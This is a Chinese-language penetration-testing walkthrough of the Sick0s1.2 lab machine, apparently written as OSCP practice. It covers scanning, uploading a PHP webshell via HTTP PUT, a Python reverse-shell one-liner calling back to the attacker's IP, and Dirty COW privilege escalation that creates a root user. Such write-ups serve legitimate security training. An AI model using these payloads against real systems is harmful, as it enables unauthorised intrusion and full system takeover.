# 一、信息收集

1. 主机发现，如下，经测试发现靶机的ip为192.168.50.157
   
   ```shell
   sudo arp-scan -l
   ```
   
   ![1.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/1.png)

2. 端口扫描，只开放了22端口和80端口
   
   ```shell
   nmap -p- -sV -sC 192.168.50.157
   ```
   
   ![2.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/2.png)

3. 识别80端口web服务，如下，web中间件为lighttpd 1.4.28，php 5.3.10
   
   ```shell
   whatweb http://192.168.50.157
   ```
   
   ![3.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/3.png)

4. 扫描web目录，发现有一个test目录，但是test目录下没有东西
   
   ```shell
   gobuster dir -w /usr/share/dirb/wordlists/big.txt -u http://192.168.50.157
   ```
   
   ![4.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/4.png)

5. 使用nmap扫一下这个端口和目录支持的http方法
   
   ```shell
   nmap -p 80 192.168.50.157 --script http-methods
   ```
   
   ![5.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/5.png)

6. 发现支持options方法，http的options方法可用来探测服务器对http资源所支持的方法，使用curl探测一下http是否可写
   
   ```shell
   curl -v -X OPTIONS http://192.168.50.157/test/
   ```
   
   ![6.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/6.png)

7. 如上，发现支持PUT方法，说明test目录可写

# 二、getshell

1. 直接写一个webshell上去，如下，查看test目录，发现写入成功
   
   ```shell
   curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.50.157/test/shell.php
   ```
   
   ![7.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/7.png)

2. 利用命令执行反弹shell
   
   ```shell
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.50.215",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' 
   ```
   
   ![8.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/8.png)

3. 成功getshell，获取到ww-data权限

# 三、权限提升

1. 查看系统内核版本
   
   ```shell
   uname -a
   lsb_release -a
   ```
   
   ![9.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/9.png)

2. 发现系统为ubuntu 12.04.4，内核版本为linux 3.11.0-15，这个版本的ubuntu存在脏牛提权漏洞CVE-2016-5195，在exploitdb上搜索该cve，发现有exp脚本
   
   ![10.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/10.png)

3. 接下来就简单了，直接脏牛一把梭，把exp脚本上传到靶机上
   
   ```shell
   curl --upload-file 40839. -v --url http://192.168.50.157/test/40839. -0 --http1.0
   ```
   
   ![11.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/11.png)
           

4. 编译exp，会出现报错，需要链接一下依赖库
   
   ```shell
   gcc 40839.c -pthread -lcrypt -o exp
   ```
   
   ![12.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/12.png)

5. 执行exp，输入一个新密码
   
   ![13.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/13.png)

6. ssh连接新用户firefart，密码就是刚刚exp中输入的密码，成功获取root权限，但是注意，这个exp可能会让靶机系统崩溃
   
   ![14.png](/Users/mac/notebook/NoteBook/OSCP/img/Sick0s1.2/14.png)